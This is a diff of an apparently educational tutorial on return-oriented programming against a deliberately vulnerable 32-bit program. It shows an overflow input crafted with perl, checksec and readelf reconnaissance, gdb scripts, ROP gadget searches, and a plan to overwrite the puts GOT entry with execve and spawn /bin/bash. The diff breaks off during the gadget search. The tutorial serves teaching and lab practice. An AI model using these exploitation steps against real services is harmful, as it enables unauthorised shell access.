@@ -54,32 +54,32 @@ If using Debian Testing or `Kali Linux`_ (see `Kali Linux Documentation`_), insu
   fi
 
 
-The vulnerable program
-======================
+Finding the stack overflow
+==========================
+
+
+Finding the vulnerable program
+------------------------------
 
 To study ROP we're going to assume a vulnerable program :program:`prog` that conveniently enough:
 
-* Your recon has revealed a base64 encoded copy (:download:`file <rop_example/file>`) of the vulnerable program.
+#. Your recon has revealed a base64 encoded copy (:download:`file <rop_example/file>`) of the vulnerable program.
 
-  Either the remote server admins are so incompetent as to allow access to a copy of their program, or it's a well-known program you can obtain.
+   Either the remote server admins are so incompetent as to allow access to a copy of their program, or it's a well-known program you can obtain.
 
-* The program is running on a remote server at some port:
+#. The program is running on a remote server at some port:
 
-  .. code-block:: bash
+   .. code-block:: bash
 
-     sudo -u nobody nohup socat tcp4-listen:8080,reuseaddr,fork exec:./prog > /tmp/nohup_8080 &
+      sudo -u nobody nohup socat tcp4-listen:8080,reuseaddr,fork exec:./prog > /tmp/nohup_8080 &
 
-  You can safely simulate this locally by running:
+   You can safely simulate this locally by running:
 
-  .. code-block:: bash
+   .. code-block:: bash
 
-     sudo -u nobody socat tcp4-listen:8080,bind=127.0.0.1,reuseaddr,fork exec:./prog
+      sudo -u nobody socat tcp4-listen:8080,bind=127.0.0.1,reuseaddr,fork exec:./prog
 
-So proceed with the exploit:
-
-#. Download the base64-encoded ELF :download:`file <rop_example/file>`.
-
-#. Analyze it via:
+#. Discover input 57 leads to unlimited buffer input:
 
    .. code-block:: bash
 
@@ -96,568 +96,599 @@ So proceed with the exploit:
       echo "1" | ./prog
       echo "57\nbye bye" | ./prog
 
-#. Analyze the program's assembly code, looking for vulnerabilities. To get an assembly code listing:
+
+Analyze the program's assembly code
+-----------------------------------
+
+
+Assembly code from:program:`objdump`
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+:program:`objdump` provides a complete listing of the ELF assembly:
+
+.. code-block:: console
+
+  objdump -M intel -s -S prog > prog.txt
+
    
+Below you only see the .rodata section with the main and play routines. The program asks an initial question, and if you answer it correctly with "`42 <http://en.wikipedia.org/wiki/42_(number)>`_" you are asked second question, the answer to which is seemingly ignored. Well, not quite. The answer to the second question is written to the stack, allowing a stack overflow.
 
-   .. code-block:: console
+.. _code_summary:
 
-      objdump -M intel -s -S prog > prog.txt
-
-   
-   Below you only see the .rodata section with the main and play routines. The program asks an initial question, and if you answer it correctly with "`42 <http://en.wikipedia.org/wiki/42_(number)>`_" you are asked second question, the answer to which is seemingly ignored. Well, not quite. The answer to the second question is written to the stack, allowing a stack overflow.
-
-   .. _code_summary:
-
-   .. literalinclude:: rop_example/code-summary.odmp
-      :language: text
+.. literalinclude:: rop_example/code-summary.odmp
+   :language: text
 
 
+Finding the overflow
+^^^^^^^^^^^^^^^^^^^^
 
-#. Let's do a little address math. The answer to the program's second question is stored starting at offset 0x107 (263 decimal) bytes into the stack. So the answer's first 267 bytes clobbers the callee's stack and the next 4 clobber the return address stored in the caller's stack. So the stack looks like:
+Let's do a little address math. The answer to the program's second question is stored starting at offset 0x107 (263 decimal) bytes into the stack. So the answer's first 267 bytes clobbers the callee's stack and the next 4 clobber the return address stored in the caller's stack. So the stack looks like:
   
   
-   .. graphviz::
+.. graphviz::
 
-     digraph S {
-       node [ shape=record ]
-       EBP
-       stack [ label="{ ... caller stack | = return address | <ebp> = caller EBP | ... callee buffer | <buffer> buffer start (@ ebp - 263) | ... more callee stack | <esp> ESP (last in callee stack)}" ]
-       ESP
-       BUFFER [ label="Input Buffer\n @ ebp - 0x107\n 267 bytes of storage" ]
-       EBP -> stack:ebp
-       BUFFER -> stack:buffer
-       ESP -> stack:esp
-     }
+  digraph S {
+    node [ shape=record ]
+    EBP
+    stack [ label="{ ... caller stack | = return address | <ebp> = caller EBP | ... callee buffer | <buffer> buffer start (@ ebp - 263) | ... more callee stack | <esp> ESP (last in callee stack)}" ]
+    ESP
+    BUFFER [ label="Input Buffer\n @ ebp - 0x107\n 267 bytes of storage" ]
+    EBP -> stack:ebp
+    BUFFER -> stack:buffer
+    ESP -> stack:esp
+  }
 
-   
-   To verify this analysis, create a stack-based buffer overflow setting the return address to 0xfeedbeef. Running the program should result in a segfault at 0xfeedbeef. Here's some code to answer the program's second question with 267 X's + 4 bytes = 0xfeedbeef. When the play routine tries to return to the caller, the overwritten stack return address of 0xfeedbeef is copied to the eip register, causing a SIGSEGV:
 
-   .. code-block:: bash
+To verify this analysis, create a stack-based buffer overflow setting the return address to 0xfeedbeef. Running the program should result in a segfault at 0xfeedbeef. Here's some code to answer the program's second question with 267 X's + 4 bytes = 0xfeedbeef. When the play routine tries to return to the caller, the overwritten stack return address of 0xfeedbeef is copied to the eip register, causing a SIGSEGV:
 
-      # Create input file for 0xfeedbeef SIGSEGV
-      perl -e 'print "57\n" . "X"x267 . "\xEF\xBE\xED\xFE"' > input    
+.. code-block:: bash
 
-      ./prog < input
-      sudo dmesg | grep segfault | tail -n 1
+   # Create input file for 0xfeedbeef SIGSEGV
+   perl -e 'print "57\n" . "X"x267 . "\xEF\xBE\xED\xFE"' > input    
 
-   Here's the result of running the code:
+   ./prog < input
+   sudo dmesg | grep segfault | tail -n 1
 
-   .. code-block:: text
-      :emphasize-lines: 1,9-
+Here's the result of running the code:
 
-      hacker@kali:~$ ./prog < input
-      Select from the menu?
-      1. Choice one?
-      2. More choices?
-      3. Something else to choose??
-      > 
-      Almost there ... expand your horizons.
-      > Not enough ... you must really try more before your success.
-      Segmentation fault
-      hacker@kali:~$ sudo dmesg | grep segfault | tail -n 1
-      [13009.861072] prog[9225]: segfault at feedbeef ip 00000000feedbeef sp 00000000ffc9ead0 error 14
+.. code-block:: text
+   :emphasize-lines: 1,9-
+
+   hacker@kali:~$ ./prog < input
+   Select from the menu?
+   1. Choice one?
+   2. More choices?
+   3. Something else to choose??
+   > 
+   Almost there ... expand your horizons.
+   > Not enough ... you must really try more before your success.
+   Segmentation fault
+   hacker@kali:~$ sudo dmesg | grep segfault | tail -n 1
+   [13009.861072] prog[9225]: segfault at feedbeef ip 00000000feedbeef sp 00000000ffc9ead0 error 14
 
 
 Planning the exploit/payload
-----------------------------
-
-#. Background
-
-   You will need a basic understanding of executables and dynamic linking:
-
-     `Computer Science from the Bottom Up`_ covers binary files (`Chapter 8. Behind the process`_) and the GOT table (`Chapter 9. Dynamic Linking`_).
-
-     `High level explanation on some binary executable security`_ for an explanation of the terms used here.
-
-     GOT-PLT_ covers the PLT/GOT interaction with Partial RELRO.
-
-     `Introduction to return oriented programming (ROP)`_
-
-     `ROP (slides 31+)`_
+============================
 
 
-#. Do some reconnaissance to get an attack outline.
+Background reading
+------------------
 
-   Use `checksec.sh`_ to analyze the binary for vulnerabilities:
+You will need a basic understanding of executables and dynamic linking:
 
-   .. code-block:: bash
+  `Computer Science from the Bottom Up`_ covers binary files (`Chapter 8. Behind the process`_) and the GOT table (`Chapter 9. Dynamic Linking`_).
 
-      checksec --file prog
+  `High level explanation on some binary executable security`_ for an explanation of the terms used here.
 
-   Running the above results in:
+  GOT-PLT_ covers the PLT/GOT interaction with Partial RELRO.
 
-   .. code-block:: text
+  `Introduction to return oriented programming (ROP)`_
 
-      hacker@kali:~$ checksec --file prog
-      RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	FORTIFY	Fortified Fortifiable  FILE
-      Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No	0		2	prog
-
-   Here's the good news:
-
-     FORTIFY_SOURCE_
-       This compiled in buffer overflow check is not enabled.
-
-     `STACK CANARY`_
-       Not enabled allowing stack buffer overflows.
-
-     PIE_
-       Not enabled.
-
-   Here's the good/bad news:
-
-     RELRO (GOT-PLT_)
-       Partial RELRO, which allows GOT table overwrites.
-
-   Here's the bad news:
-
-     NX_
-       This forces us to use ROP.
-
-   It is our good fortune to not have stack canaries, so the stack overflow should work. We'll use ROP_ (Return Oriented Programming) combined with GOT table overwrite to overcome NX_ and ASLR_ (Address Space Layout Randomization).
-
-   So we'll overwrite the GOT address for one of the :program:`libc` routines with the address of :command:`execve`. Let's see what :program:`libc` routines we can exploit.
+  `ROP (slides 31+)`_
 
 
-   .. code-block:: bash
+Analyze the program with :program:`checksec`
+--------------------------------------------
 
-      file prog
-      # Get the libc version used locally
-      ldd prog
-      # What libc routines are available ...
-      readelf --relocs prog
+Use `checksec.sh`_ to analyze the binary for vulnerabilities:
 
-   Running these commands gives us:
+.. code-block:: bash
 
-   .. code-block:: console
-      :emphasize-lines: 1,4,9,23
+   checksec --file prog
 
-      hacker@kali:~$ file prog
-      prog: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.15, BuildID[sha1]=228f96f2cf7397f9078fd1f092709353abe98be6, not stripped
-      hacker@kali:~$ # Get the libc version used locally
-      hacker@kali:~$ ldd prog
-              linux-gate.so.1 (0xf7f09000)
-              libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7d08000)
-              /lib/ld-linux.so.2 (0xf7f0b000)
-      hacker@kali:~$ # What libc routines are available ...
-      hacker@kali:~$ readelf --relocs prog
+Running the above results in:
 
-      Relocation section '.rel.dyn' at offset 0x2fc contains 2 entries:
-       Offset     Info    Type            Sym.Value  Sym. Name
-      08049ff0  00000106 R_386_GLOB_DAT    00000000   __gmon_start__
-      0804a020  00000705 R_386_COPY        0804a020   stdout@GLIBC_2.0
+.. code-block:: text
 
-      Relocation section '.rel.plt' at offset 0x30c contains 6 entries:
-       Offset     Info    Type            Sym.Value  Sym. Name
-      0804a000  00000107 R_386_JUMP_SLOT   00000000   __gmon_start__
-      0804a004  00000207 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
-      0804a008  00000307 R_386_JUMP_SLOT   00000000   fflush@GLIBC_2.0
-      0804a00c  00000407 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0
-      0804a010  00000507 R_386_JUMP_SLOT   00000000   __isoc99_scanf@GLIBC_2.7
-      0804a014  00000607 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0
+   hacker@kali:~$ checksec --file prog
+   RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	FORTIFY	Fortified Fortifiable  FILE
+   Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No	0		2	prog
 
-   The outline of a 2-stage attack is taking place: stage-0 will be what we call a "payload loader": it's job is to load the real payload (stage-1) into a fixed address in the .data elf section. Stage-0 has 2 steps: (1) use ``scanf`` to read stage-1 into .data section; (2) jump to the stage-1 payload via a ``leave`` instruction. Stage-1 will have 2 steps: (1) perform a GOT overwrite of the ``puts`` GOT entry to change it to ``execve``; (2) call ``execve`` to change the program's process to ``/bin/bash``. You'll see that some of these simple tasks are made harder by the fact that we cannot execute arbitrary instructions: we are reduced to using a highly limited selection of "gadgets" (little sections of code followed by a ``ret`` instruction). That makes some of the payload look a little tortuous.
+Here's the good news:
 
+  FORTIFY_SOURCE_
+    This compiled in buffer overflow check is not enabled.
 
-#. We need some information to carry out this attack:
+  `STACK CANARY`_
+    Not enabled allowing stack buffer overflows.
 
-   The attack will call :program:`libc` routines ``scanf`` and ``puts``. ``scanf`` will be used to input the attack, while ``puts``'s GOT entry will be overwritten with the address of ``execve`` so a call to ``puts`` will open up a shell. To exploit these routines we need their PLT addresses. Here we determine they are ``scanf`` = 0x080483bc and ``puts`` = 0x080483cc by simply running ``objdump -S -j .plt prog | egrep '(scanf@plt|puts@plt)'``:
+  PIE_
+    Not enabled.
+
+Here's the good/bad news:
+
+  RELRO (GOT-PLT_)
+    Partial RELRO, which allows GOT table overwrites.
+
+Here's the bad news:
+
+  NX_
+    This forces us to use ROP.
+
+It is our good fortune to not have stack canaries, so the stack overflow should work. We'll use ROP_ (Return Oriented Programming) combined with GOT table overwrite to overcome NX_ and ASLR_ (Address Space Layout Randomization).
 
 
-   .. code-block:: console
-      :emphasize-lines: 3-
+The outlines of ROP exploitation
+--------------------------------
 
-      hacker@kali:~$ # We can use scanf and puts
-      hacker@kali:~$ #   so get their calling address.
-      hacker@kali:~$ objdump -S -j .plt prog | egrep '(scanf@plt|puts@plt)'
-      080483bc <__isoc99_scanf@plt>:
-      080483cc <puts@plt>:
+So we'll overwrite the GOT address for one of the :program:`libc` routines with the address of :command:`execve`. Let's see what :program:`libc` routines we can exploit.
 
 
-   ``scanf`` will be called in stage-0 to transfer the stage-1 attack code to the .data section. ``scanf`` will require 2 inputs: (1) the address of the "%s" format string, (2) the destination address in the .data segment. For (1), visually inspect the .rodata code listing to see the address of "%s" is 0x8048707. For (2), we show it is 0x0804a018 using either ``readelf`` or ``objdump``:
+.. code-block:: bash
+
+   file prog
+   # Get the libc version used locally
+   ldd prog
+   # What libc routines are available ...
+   readelf --relocs prog
+
+Running these commands gives us:
+
+.. code-block:: console
+   :emphasize-lines: 1,4,9,23
+
+   hacker@kali:~$ file prog
+   prog: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.15, BuildID[sha1]=228f96f2cf7397f9078fd1f092709353abe98be6, not stripped
+   hacker@kali:~$ # Get the libc version used locally
+   hacker@kali:~$ ldd prog
+           linux-gate.so.1 (0xf7f09000)
+           libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7d08000)
+           /lib/ld-linux.so.2 (0xf7f0b000)
+   hacker@kali:~$ # What libc routines are available ...
+   hacker@kali:~$ readelf --relocs prog
+
+   Relocation section '.rel.dyn' at offset 0x2fc contains 2 entries:
+    Offset     Info    Type            Sym.Value  Sym. Name
+   08049ff0  00000106 R_386_GLOB_DAT    00000000   __gmon_start__
+   0804a020  00000705 R_386_COPY        0804a020   stdout@GLIBC_2.0
+
+   Relocation section '.rel.plt' at offset 0x30c contains 6 entries:
+    Offset     Info    Type            Sym.Value  Sym. Name
+   0804a000  00000107 R_386_JUMP_SLOT   00000000   __gmon_start__
+   0804a004  00000207 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
+   0804a008  00000307 R_386_JUMP_SLOT   00000000   fflush@GLIBC_2.0
+   0804a00c  00000407 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0
+   0804a010  00000507 R_386_JUMP_SLOT   00000000   __isoc99_scanf@GLIBC_2.7
+   0804a014  00000607 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0
+
+The outline of a 2-stage attack is taking place: stage-0 will be what we call a "payload loader": it's job is to load the real payload (stage-1) into a fixed address in the .data elf section. Stage-0 has 2 steps: (1) use ``scanf`` to read stage-1 into .data section; (2) jump to the stage-1 payload via a ``leave`` instruction. Stage-1 will have 2 steps: (1) perform a GOT overwrite of the ``puts`` GOT entry to change it to ``execve``; (2) call ``execve`` to change the program's process to ``/bin/bash``. You'll see that some of these simple tasks are made harder by the fact that we cannot execute arbitrary instructions: we are reduced to using a highly limited selection of "gadgets" (little sections of code followed by a ``ret`` instruction). That makes some of the payload look a little tortuous.
 
 
-   .. code-block:: console
-      :emphasize-lines: 1-
+Collecting libc information
+---------------------------
 
-      hacker@kali:~$ readelf --sections  prog | grep '\.data'
-        [23] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4
-      hacker@kali:~$ objdump -S -j .data prog | grep start
-      0804a018 <__data_start>:
+The attack will call :program:`libc` routines ``scanf`` and ``puts``. ``scanf`` will be used to input the attack, while ``puts``'s GOT entry will be overwritten with the address of ``execve`` so a call to ``puts`` will open up a shell. To exploit these routines we need their PLT addresses. Here we determine they are ``scanf`` = 0x080483bc and ``puts`` = 0x080483cc by simply running ``objdump -S -j .plt prog | egrep '(scanf@plt|puts@plt)'``:
 
-   We won't be actually calling ``puts``. Instead we'll be using a technique called GOT overwrite to replace the address of ``puts`` with that of ``execve`` so that when ``puts`` is called, ``execve`` will actually be called.
-  
-   But before we discuss GOT overwrite let's take care of ``execve``'s calling arguments. The first argument will be the string "/bin/bash" and will be will be read as part of stage-1 by the ``scanf`` call in stage-0. The other two arguments will be NULL pointers and a quick scan of the .rodata section shows it ending with a NULL at address 0x8048709.
+
+.. code-block:: console
+   :emphasize-lines: 3-
+
+   hacker@kali:~$ # We can use scanf and puts
+   hacker@kali:~$ #   so get their calling address.
+   hacker@kali:~$ objdump -S -j .plt prog | egrep '(scanf@plt|puts@plt)'
+   080483bc <__isoc99_scanf@plt>:
+   080483cc <puts@plt>:
+
+
+``scanf`` will be called in stage-0 to transfer the stage-1 attack code to the .data section. ``scanf`` will require 2 inputs: (1) the address of the "%s" format string, (2) the destination address in the .data segment. For (1), visually inspect the .rodata code listing to see the address of "%s" is 0x8048707. For (2), we show it is 0x0804a018 using either ``readelf`` or ``objdump``:
+
+
+.. code-block:: console
+   :emphasize-lines: 1-
+
+   hacker@kali:~$ readelf --sections  prog | grep '\.data'
+     [23] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4
+   hacker@kali:~$ objdump -S -j .data prog | grep start
+   0804a018 <__data_start>:
+
+We won't be actually calling ``puts``. Instead we'll be using a technique called GOT overwrite to replace the address of ``puts`` with that of ``execve`` so that when ``puts`` is called, ``execve`` will actually be called.
+
+But before we discuss GOT overwrite let's take care of ``execve``'s calling arguments. The first argument will be the string "/bin/bash" and will be will be read as part of stage-1 by the ``scanf`` call in stage-0. The other two arguments will be NULL pointers and a quick scan of the .rodata section shows it ending with a NULL at address 0x8048709.
+
+
+GOT overwrite planning
+----------------------
+   
+The whole idea of GOT overwrite is to change the GOT pointer from one routine (``puts``) that you don't need to use, to another (``execve``) that you would like to use. The difficulty is that with ASLR_ you don't know ``execve``'s address until the program is loaded, which your pre-load exploit code can't know. However, for any given :program:`libc` version, you do know the difference between ``puts``'s address and ``execve``'s address.
+
+   ``puts`` = :program:`libc` start + offset(``puts``)
+
+   ``execve`` = :program:`libc` start + offset(``execve``)
+
+So we can compute
+
+   ``execve`` = ``puts`` + offset(``execve``) - offset(``puts``)
+
+The only catch is that the offset difference offset(``execve``) - offset(``puts``) varies with the :program:`libc` version (seemingly increasing over time as code is added to libc). To avoid resorting to a brute-force attack, we'd have to know the target system's :program:`libc`. For now we'll ignore this difficultly and focus on getting the attack to work locally where we do know the offsets.
+
+We'll need to overwrite ``puts``'s GOT entry with the address of ``execve``. The ``puts`` GOT table entry is ( ``__libc_start_main`` + offset(``puts``)). To change it to ``execve``'s GOT table entry we just need to (1) locate ``puts``'s GOT table address, then (2) add(offset(``execve``) - offset(``puts``)) to ``puts``'s GOT entry to have ``execve`` called instead. 
+
+So we determine ``puts``'s GOT table entry address = 0804a014 two ways. The simplest way is using a ``readelf`` 1-liner. But we also show how using  ``gdb`` because it illustrates going from the PLT entry to the GOT entry, plus shows how to get the current actual address for ``puts``. Note that both the GOT table entry and using ``gdb``'s ``print puts`` command agree that for this particular run ``puts`` was loaded at 0xf7e3b160. Note this shows that the system lacks `ASCII armoring <http://en.wikipedia.org/wiki/Return-to-libc_attack#Protection_from_return-to-libc_attacks>`_ as the address of ``puts`` = 0xf7e3b160 doesn't have leading whitespace.
+
+.. code-block:: bash
+   :emphasize-lines: 2,5,8-9,23-24
+
+   # readelf 1-liner
+   readelf --relocs prog | grep ' puts'
+
+   # gdb going through PLT to GOT
+   cat > GOT.in <<EOF
+   57
+   anything
+   EOF
+   cat > GOT.gdb <<EOF
+   # carefully choose breakpoint after puts called
+   break *0x804851e
+   run < GOT.in
+   # puts call
+   x/i 0x804856f
+   # plt call to got
+   x/i 0x80483cc
+   # got entry
+   x/x 0x804a014
+   # another way to get puts address
+   print puts
+   kill
+   quit
+   EOF
+   gdb --batch --command=GOT.gdb ./prog
+
+Running these commands gives us:
+
+.. code-block:: text
+   :emphasize-lines: 1,15-16,27-30
+
+   hacker@kali:~$ cat > GOT.gdb <<EOF
+   > # carefully choose breakpoint after puts called
+   > break *0x804851e
+   > run < GOT.in
+   > # puts call
+   > x/i 0x804856f
+   > # plt call to got
+   > x/i 0x80483cc
+   > # got entry
+   > x/x 0x804a014
+   > # another way to get puts address
+   > print puts
+   > kill
+   > quit
+   > EOF
+   hacker@kali:~$ gdb --batch --command=GOT.gdb ./prog
+   Breakpoint 1 at 0x804851e
+   Select from the menu?
+   1. Choice one?
+   2. More choices?
+   3. Something else to choose??
+   > 
+   Almost there ... expand your horizons.
+   > Not enough ... you must really try more before your success.
+
+   Breakpoint 1, 0x0804851e in main ()
+      0x804856f <play+79>:	call   0x80483cc <puts@plt>
+      0x80483cc <puts@plt>:	jmp    *0x804a014
+   0x804a014 <puts@got.plt>:	0xf7e3b160
+   $1 = {<text variable, no debug info>} 0xf7e3b160 <puts>
+   Kill the program being debugged? (y or n) [answered Y; input not from terminal]
+
+
+
+Next we determine (offset(``execve``) - offset(``puts``)) = 0x56cc0 below (at least on the author's host, yours may be different). Since we'll be doing this repeatedly please download :download:`libc-offset.sh <rop_example/libc-offset.sh>` and make it executable (``chmod +x libc-offset.sh``):
+
+.. literalinclude:: rop_example/libc-offset.sh
+   :language: bash
+
+
+
+Then the offset is easily computed:
+
+.. code-block:: console
+
+   hacker@kali:~$ ./libc-offset.sh ./prog execve puts
+   0x56cc0
 
    
-#. GOT Overwrite Depends on the Host's :program:`libc`
+Finding ROP gadgets
+-------------------
+
+We need some ROP gadgets (code snippets ending in ``ret``) to carry out the required computations. Why gadgets? Remember that anywhere you can input data is writable but not executable memory. So you can't input instructions, only addresses of instructions and the input arguments needed (if any). And since you place the instructions linearly in the same memory, those instruction addresses must be to code sections that actually return to your exploit list, hence ROP = return-oriented programming. What returns? Well, existing :program:`libc` routines like ``scanf`` for one. That part of the exploit is known as return-to-libc. And addresses of instructions that happen to sit a little before a return instruction: those little code sections are called ROP gadgets. But it's not easy locating those gadgets, hence we use ropeme_ for locating gadgets to use in a ROP exploit.
    
-   
-   The whole idea of GOT overwrite is to change the GOT pointer from one routine (``puts``) that you don't need to use, to another (``execve``) that you would like to use. The difficulty is that with ASLR_ you don't know ``execve``'s address until the program is loaded, which your pre-load exploit code can't know. However, for any given :program:`libc` version, you do know the difference between ``puts``'s address and ``execve``'s address.
-  
-      ``puts`` = :program:`libc` start + offset(``puts``)
-      
-      ``execve`` = :program:`libc` start + offset(``execve``)
-  
-   So we can compute
-  
-      ``execve`` = ``puts`` + offset(``execve``) - offset(``puts``)
-      
-   The only catch is that the offset difference offset(``execve``) - offset(``puts``) varies with the :program:`libc` version (seemingly increasing over time as code is added to libc). To avoid resorting to a brute-force attack, we'd have to know the target system's :program:`libc`. For now we'll ignore this difficultly and focus on getting the attack to work locally where we do know the offsets.
-          
-   We'll need to overwrite ``puts``'s GOT entry with the address of ``execve``. The ``puts`` GOT table entry is ( ``__libc_start_main`` + offset(``puts``)). To change it to ``execve``'s GOT table entry we just need to (1) locate ``puts``'s GOT table address, then (2) add(offset(``execve``) - offset(``puts``)) to ``puts``'s GOT entry to have ``execve`` called instead. 
+We break the exploit into 2 stages for one very important reason. The buffer overflow writes on the stack, and the stack's address varies with each run. If we need to use a gadget with a ``leave`` instruction we'll need to set ebp to the address to return in the stack. Also, we may want to call a couple of routines each of which need pointers to the addresses of arguments. If those arguments sit in the stack as part of the first buffer overflow, we don't know their addresses. If, however, our first (stage-0) buffer overflow merely sets up a second (stage-1) buffer into into a known, fixed part of memory we can easily pass arguments as we know the addresses within that buffer.
 
-   So we determine ``puts``'s GOT table entry address = 0804a014 two ways. The simplest way is using a ``readelf`` 1-liner. But we also show how using  ``gdb`` because it illustrates going from the PLT entry to the GOT entry, plus shows how to get the current actual address for ``puts``. Note that both the GOT table entry and using ``gdb``'s ``print puts`` command agree that for this particular run ``puts`` was loaded at 0xf7e3b160. Note this shows that the system lacks `ASCII armoring <http://en.wikipedia.org/wiki/Return-to-libc_attack#Protection_from_return-to-libc_attacks>`_ as the address of ``puts`` = 0xf7e3b160 doesn't have leading whitespace.
+stage-0 consists of a call to ``scanf`` which has 2 arguments so we need a gadget to ``pop`` 2 items off the stack. We also need a leave statement to set the esp stack pointer to the stage-1 buffer location. We choose the first of each of these
 
-   .. code-block:: bash
-      :emphasize-lines: 2,5,8-9,23-24
+.. code-block:: bash
 
-      # readelf 1-liner
-      readelf --relocs prog | grep ' puts'
+   # Now use ropeme
+   source activate rop
+   ropshell.py
+   generate prog 4
+   search pop ? pop ?
+   search leave
+   search pop ebp
+   # manual control-d
 
-      # gdb going through PLT to GOT
-      cat > GOT.in <<EOF
-      57
-      anything
-      EOF
-      cat > GOT.gdb <<EOF
-      # carefully choose breakpoint after puts called
-      break *0x804851e
-      run < GOT.in
-      # puts call
-      x/i 0x804856f
-      # plt call to got
-      x/i 0x80483cc
-      # got entry
-      x/x 0x804a014
-      # another way to get puts address
-      print puts
-      kill
-      quit
-      EOF
-      gdb --batch --command=GOT.gdb ./prog
+Running these commands gives us:
 
-   Running these commands gives us:
+.. code-block:: console
+   :emphasize-lines: 1-2,4,11,13-15,17,19-21,23,25-
 
-   .. code-block:: text
-      :emphasize-lines: 1,15-16,27-30
+   hacker@kali:~$ source activate rop
+   (rop) hacker@kali:~$ ropshell.py
+   Simple ROP interactive shell: [generate, load, search] gadgets
+   ROPeMe> generate prog 4
+   Generating gadgets for prog with backward depth=4
+   It may take few minutes depends on the depth and file size...
+   Processing code block 1/1
+   Generated 86 gadgets
+   Dumping asm gadgets to file: prog.ggt ...
+   OK
+   ROPeMe> search pop ? pop ?
+   Searching for ROP gadget:  pop ? pop ? with constraints: []
+   0x8048462L: pop ebx ; pop ebp ;;
+   0x8048627L: pop ebx ; pop ebp ;;
+   0x80485e7L: pop edi ; pop ebp ;;
 
-      hacker@kali:~$ cat > GOT.gdb <<EOF
-      > # carefully choose breakpoint after puts called
-      > break *0x804851e
-      > run < GOT.in
-      > # puts call
-      > x/i 0x804856f
-      > # plt call to got
-      > x/i 0x80483cc
-      > # got entry
-      > x/x 0x804a014
-      > # another way to get puts address
-      > print puts
-      > kill
-      > quit
-      > EOF
-      hacker@kali:~$ gdb --batch --command=GOT.gdb ./prog
-      Breakpoint 1 at 0x804851e
-      Select from the menu?
-      1. Choice one?
-      2. More choices?
-      3. Something else to choose??
-      > 
-      Almost there ... expand your horizons.
-      > Not enough ... you must really try more before your success.
+   ROPeMe> search leave
+   Searching for ROP gadget:  leave with constraints: []
+   0x804836aL: leave ;;
+   0x8048491L: leave ;;
+   0x804851eL: leave ;;
 
-      Breakpoint 1, 0x0804851e in main ()
-         0x804856f <play+79>:	call   0x80483cc <puts@plt>
-         0x80483cc <puts@plt>:	jmp    *0x804a014
-      0x804a014 <puts@got.plt>:	0xf7e3b160
-      $1 = {<text variable, no debug info>} 0xf7e3b160 <puts>
-      Kill the program being debugged? (y or n) [answered Y; input not from terminal]
+   ROPeMe> search pop ebp
+   Searching for ROP gadget:  pop ebp with constraints: []
+   0x8048463L: pop ebp ;;
+   0x80485e8L: pop ebp ;;
+   0x80485f3L: pop ebp ;;
 
 
-   
-   Next we determine (offset(``execve``) - offset(``puts``)) = 0x56cc0 below (at least on the author's host, yours may be different). Since we'll be doing this repeatedly please download :download:`libc-offset.sh <rop_example/libc-offset.sh>` and make it executable (``chmod +x libc-offset.sh``):
+stage-1 presents more of a gadget selection challenge. We leave it up to the reader to find the easier gadgets. Here we explain the contortions we went through to update the GOT starting at the end of the GOT computations then deducing the preceding gadgets required. After a bit of search and contemplation, updating the GOT table would be done with the gadget
 
-   .. literalinclude:: rop_example/libc-offset.sh
-      :language: bash
+.. code-block:: console
 
+   0x804845eL: add [ebx+0x5d5b04c4] eax ;;
 
-
-   Then the offset is easily computed:
-
-   .. code-block:: console
-
-      hacker@kali:~$ ./libc-offset.sh ./prog execve puts
-      0x56cc0
-
-   
-#. We need some ROP gadgets (code snippets ending in ``ret``) to carry out the required computations. Why gadgets? Remember that anywhere you can input data is writable but not executable memory. So you can't input instructions, only addresses of instructions and the input arguments needed (if any). And since you place the instructions linearly in the same memory, those instruction addresses must be to code sections that actually return to your exploit list, hence ROP = return-oriented programming. What returns? Well, existing :program:`libc` routines like ``scanf`` for one. That part of the exploit is known as return-to-libc. And addresses of instructions that happen to sit a little before a return instruction: those little code sections are called ROP gadgets. But it's not easy locating those gadgets, hence we use ropeme_ for locating gadgets to use in a ROP exploit.
-   
-   We break the exploit into 2 stages for one very important reason. The buffer overflow writes on the stack, and the stack's address varies with each run. If we need to use a gadget with a ``leave`` instruction we'll need to set ebp to the address to return in the stack. Also, we may want to call a couple of routines each of which need pointers to the addresses of arguments. If those arguments sit in the stack as part of the first buffer overflow, we don't know their addresses. If, however, our first (stage-0) buffer overflow merely sets up a second (stage-1) buffer into into a known, fixed part of memory we can easily pass arguments as we know the addresses within that buffer.
-
-   stage-0 consists of a call to ``scanf`` which has 2 arguments so we need a gadget to ``pop`` 2 items off the stack. We also need a leave statement to set the esp stack pointer to the stage-1 buffer location. We choose the first of each of these
-
-   .. code-block:: bash
-
-      # Now use ropeme
-      source activate rop
-      ropshell.py
-      generate prog 4
-      search pop ? pop ?
-      search leave
-      search pop ebp
-      # manual control-d
-
-   Running these commands gives us:
-
-   .. code-block:: console
-      :emphasize-lines: 1-2,4,11,13-15,17,19-21,23,25-
-
-      hacker@kali:~$ source activate rop
-      (rop) hacker@kali:~$ ropshell.py
-      Simple ROP interactive shell: [generate, load, search] gadgets
-      ROPeMe> generate prog 4
-      Generating gadgets for prog with backward depth=4
-      It may take few minutes depends on the depth and file size...
-      Processing code block 1/1
-      Generated 86 gadgets
-      Dumping asm gadgets to file: prog.ggt ...
-      OK
-      ROPeMe> search pop ? pop ?
-      Searching for ROP gadget:  pop ? pop ? with constraints: []
-      0x8048462L: pop ebx ; pop ebp ;;
-      0x8048627L: pop ebx ; pop ebp ;;
